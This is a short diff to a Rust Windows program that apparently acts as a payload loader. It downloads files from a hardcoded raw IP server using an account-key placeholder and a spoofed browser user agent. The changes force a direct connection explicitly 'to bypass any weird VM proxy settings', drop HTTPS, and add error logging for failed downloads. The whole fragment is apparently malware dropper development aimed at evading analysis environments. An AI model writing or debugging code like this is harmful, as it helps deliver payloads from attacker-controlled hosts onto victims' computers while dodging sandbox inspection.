@@ -13,7 +13,7 @@ use windows_sys::Win32::System::Threading::*;
 use windows_sys::Win32::Networking::WinInet::*;
 
 const KEY: &str = "__ACCOUNT_KEY__";
-const SERVER: &str = "http://95.182.96.216"; // <--- HARDCODED HERE
+const SERVER: &str = "http://95.182.96.216"; // HARDCODED HERE
 
 fn to_wide(s: &str) -> Vec<u16> {
     OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
@@ -30,20 +30,21 @@ fn download_file(url: &str, dest: &Path, loader: &Path) -> bool {
     log(loader, &format!("Downloading: {}", url));
     unsafe {
         let agent = to_wide("Mozilla/5.0");
-        let h_internet = InternetOpenW(agent.as_ptr(), INTERNET_OPEN_TYPE_PRECONFIG, std::ptr::null(), std::ptr::null(), 0);
+        
+        // Use DIRECT connection to bypass any weird VM proxy settings
+        let h_internet = InternetOpenW(agent.as_ptr(), INTERNET_OPEN_TYPE_DIRECT, std::ptr::null(), std::ptr::null(), 0);
         if h_internet.is_null() { log(loader, "InternetOpenW failed"); return false; }
 
         let url_w = to_wide(url);
-        let flags = INTERNET_FLAG_RELOAD | 
-                    INTERNET_FLAG_NO_CACHE_WRITE | 
-                    INTERNET_FLAG_IGNORE_CERT_CN_INVALID | 
-                    INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | 
-                    INTERNET_FLAG_SECURE;
+        
+        // Removed INTERNET_FLAG_SECURE because we are using HTTP
+        let flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
 
         let h_url = InternetOpenUrlW(h_internet, url_w.as_ptr(), std::ptr::null(), 0, flags, 0);
         
         if h_url.is_null() { 
-            log(loader, "InternetOpenUrlW failed (Check server IP/URL or SSL error)"); 
+            let err = GetLastError();
+            log(loader, &format!("InternetOpenUrlW failed. Windows Error Code: {}", err)); 
             InternetCloseHandle(h_internet); 
             return false; 
         }
